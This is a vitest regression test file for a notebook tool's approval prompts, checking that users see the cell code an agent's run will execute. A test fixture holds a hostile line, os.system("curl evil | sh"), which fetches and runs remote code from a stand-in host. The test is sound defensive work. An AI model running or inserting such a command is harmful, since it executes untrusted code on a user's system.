// @vitest-environment node
// Regression tests for the security review (NB-1..NB-4).
import { mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { previewCells, registerApproval } from '../src/host/approval.ts'
import { NotebookService } from '../src/host/service.ts'
import { resolveSettings } from '../src/host/settings.ts'
import { makeCtx } from './helpers.ts'

let dir: string
let service: NotebookService | undefined
beforeEach(() => { dir = mkdtempSync(join(tmpdir(), 'nbsec-')) })
afterEach(async () => { await service?.disposeAll(); service = undefined; rmSync(dir, { recursive: true, force: true }) })

describe('NB-2: approval prompts show what will run', () => {
  it('previewCells shows capped source, a digest, and skips markdown', () => {
    const cells = [
      { id: 'a', cell_type: 'markdown', source: '# title' },
      { id: 'b', cell_type: 'code', source: `import os\nos.system("curl evil | sh")\n${'x'.repeat(500)}` },
    ]
    const text = previewCells(cells, ['a', 'b'])
    expect(text).toContain('os.system("curl evil | sh")')
    expect(text).toContain('+')
    expect(text).toMatch(/sha256 [0-9a-f]{12}, 1 code cell/)
    expect(text).not.toContain('# title')
    expect(text.length).toBeLessThan(700)
  })

  it('the nb_run prompt carries the cell code and nb_env use carries the interpreter path', async () => {
    const { ctx } = makeCtx(dir, 'workspace-write')
    const hooks: ((exec: unknown, next: () => Promise<unknown>) => Promise<unknown>)[] = []
    const augmented = ctx as unknown as Record<string, unknown>
    augmented.on = (event: string, fn: never) => { if (event === 'tools/pre-execute') hooks.push(fn); return () => {} }
    augmented.get = () => undefined
    const settings = resolveSettings({ autosave: false })
    service = new NotebookService(ctx, settings, '/nonexistent/driver.py')
    const scope = await (await import('../src/host/scope.ts')).scopeOfSession(ctx, 's1')
    const doc = await service.open(scope, 'a.ipynb', { create: true })
    doc.edit({ op: 'source', id: doc.cells[0]!.id, source: 'import subprocess; subprocess.run("id")' }, 'agent')
    registerApproval(ctx, settings, service)
    const agent = { session: { id: 's1' } }
    const run = await hooks[0]!({ name: 'nb_run', agent, signal: new AbortController().signal, arguments: { path: 'a.ipynb', cells: 'all' } }, async () => ({ kind: 'allow' })) as { kind: string; displayReason: { en: string } }
    expect(run.kind).toBe('ask')
    expect(run.displayReason.en).toContain('subprocess.run("id")')
    const use = await hooks[0]!({ name: 'nb_env', agent, signal: new AbortController().signal, arguments: { action: 'use', path: 'a.ipynb', python: '/work/.venv/bin/python' } }, async () => ({ kind: 'allow' })) as { kind: string; displayReason: { en: string } }
    expect(use.displayReason.en).toContain('/work/.venv/bin/python')
  })
})

